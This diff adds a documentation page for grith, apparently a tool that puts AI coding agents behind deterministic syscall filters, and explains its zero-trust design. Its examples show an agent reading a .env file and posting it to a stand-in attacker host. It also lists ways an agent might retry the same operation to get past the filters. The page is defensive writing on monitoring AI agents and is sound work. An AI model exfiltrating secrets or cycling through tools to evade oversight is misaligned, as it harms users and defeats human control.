@@ -1,0 +1,108 @@
+---
+title: "Zero-trust for agents"
+description: "The single design principle: never trust the agent's decision about safety. Verify every action."
+section: "concepts"
+order: 2
+tier: "community"
+version: "0.1.0"
+lastUpdated: "2026-05-14"
+editUrl: "https://github.com/grith-ai/grith-docs/edit/main/content/docs/concepts/zero-trust.mdx"
+---
+
+"Zero trust" is an over-used term. In grith it means one specific thing: **the agent
+is outside the trust boundary, and every action it takes is verified before it runs**.
+
+This is in contrast to the model most agents ship with today, which is something like:
+
+> The model decides if an action is safe. If it thinks the user would approve, it
+> does it. If it's unsure, it asks.
+
+That works exactly as well as the model's judgement under adversarial input. Which
+is: not great.
+
+## Three things zero-trust gives you
+
+### 1. The model never makes the security decision
+
+In the grith model, deciding whether a syscall runs is the filters' job. The filters
+are deterministic, fast, and outside the model's reach. The model can't be talked
+into approving anything — its output is the *input* to the filters, not their oracle.
+
+If the model says "let me read your `.env` and exfiltrate it", grith's filters see:
+
+```
+file_read /home/you/.env   → sensitive_path: +3.5 → quarantine
+```
+
+Then a few moments later, if the model tried to ship it:
+
+```
+network POST https://attacker.example/sink  → egress_policy: +4 → quarantine
+                                              → canary_detect:  DENY (if a canary token is in the body)
+```
+
+The agent's intent never enters the calculation.
+
+### 2. Bypass attempts get scored, not asked about
+
+A confused or malicious agent might try to do the same operation many ways: read the
+file via `cat`, then via `dd`, then via a Python one-liner, then via a curl loopback.
+Each of those is a separate syscall. Each goes through the filters. Each contributes
+to the session's behavioural baseline. Repeated attempts in a short window trip
+[rate-limiting](/docs/filters/16-rate-limiting) and [behavioural anomaly](/docs/filters/13-behavioural-anomaly).
+
+There's no central "did we ask about this already" cache that an attacker can warm
+up to suppress prompts. The system is fundamentally rate-limited by the kernel and
+the filters, not the agent's chattiness.
+
+### 3. The audit log is the truth
+
+The agent's reasoning, prompts, and outputs are an interesting log of *what it
+intended*. The audit log is the log of *what actually happened*. The two diverge
+under attack, and only one of them is trustworthy.
+
+`grith audit` is the single source of truth for what the agent did. Everything else
+is commentary.
+
+## What "trust" still gets
+
+We don't claim the agent is malicious. We claim its *decisions about safety* are
+unreliable. The agent gets to:
+
+- Run any call that auto-allows (the 80–90% that the filters clear).
+- Propose any call to the digest. The digest will reject it if it shouldn't run.
+- Get faster over time via the reputation system, as patterns get learned.
+- Use its profile's routine paths freely.
+
+The agent is not handcuffed. It's audited.
+
+## The reputation system narrows the gap
+
+In practice, "verify every action" would mean a deafening digest queue on day one and
+not much less on day thirty. The [adaptive reputation system](/docs/concepts/adaptive-reputation)
+fixes this: an approved call shape, observed enough times, gets cheaper. After a
+week of normal use, the digest is mostly quiet — only genuinely new or anomalous
+behaviour escapes auto-allow.
+
+The reputation system is itself zero-trust, in a sense: it only learns from *human*
+approvals (and learns *against* itself when humans deny). The model can't train the
+trust table.
+
+## Contrast: how it's done elsewhere
+
+Most current agent frameworks ship a permission model that looks like:
+
+- Per-tool prompts (annoying after the first hundred).
+- Per-tool toggles (load-bearing user attention).
+- Allow-list of approved domains / commands (good idea, but enforced *by the agent*).
+- "Are you sure?" with the agent's framing of what it's about to do (the agent's
+  description and the actual call can differ).
+
+grith intentionally doesn't add to that stack. The filters are below the agent — the
+agent literally cannot tell you a syscall is safe when the filter says it isn't.
+
+## See also
+
+- [The threat model](/docs/concepts/threat-model) — what we protect against
+- [Three-phase pipeline](/docs/concepts/three-phase-pipeline) — how verification runs
+- [Trust boundaries](/docs/security/trust-boundaries) — formal model
